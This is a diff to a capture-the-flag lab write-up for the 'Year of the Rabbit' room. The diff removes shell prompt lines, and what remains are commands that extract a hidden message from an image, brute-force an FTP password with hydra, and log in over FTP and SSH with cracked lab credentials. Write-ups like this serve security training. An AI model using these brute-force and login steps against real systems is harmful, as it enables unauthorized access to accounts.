@@ -53,7 +53,6 @@ This will lead us to the directory which has an image named as ``Hot_Babe.png.``
 
 **Checking if there is any message in the image.**
 ```
-┌──(egovridc㉿egovridc)-[~/C7F5/thm/yearOfrabbit]
 └─$ strings bae.png
 ```
 We found a message as shown below.
@@ -67,7 +66,6 @@ One of these is the password:
 
 ## Brute-force ftp password.
 ```
-┌──(egovridc㉿egovridc)-[~/C7F5/thm/yearOfrabbit]
 └─$ hydra -l ftpuser -P "ftp-passwds" -s 21 -o "ftp-results" ftp://10.10.59.107 
 ```
 **Result.**
@@ -78,7 +76,6 @@ password: 5iez1wGXKfPKQ
 ## Login to ftp server.
 
 ```
-┌──(egovridc㉿egovridc)-[~/C7F5/thm/yearOfrabbit]
 └─$ ftp 10.10.59.107
 Connected to 10.10.59.107.
 220 (vsFTPd 3.0.2)
@@ -113,7 +110,6 @@ ftp>
 
 **Reading Eli's_Creds.txt.**
 ```
-┌──(egovridc㉿egovridc)-[~/C7F5/thm/yearOfrabbit]
 └─$ cat Eli\'s_Creds.txt 
 +++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
 --<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
@@ -140,7 +136,6 @@ Password: DSpDiM1wAEwid
 
 **ssh**
 ```
-┌──(egovridc㉿egovridc)-[~/C7F5/thm/yearOfrabbit]
 └─$ ssh eli@10.10.59.107 
 ```
 
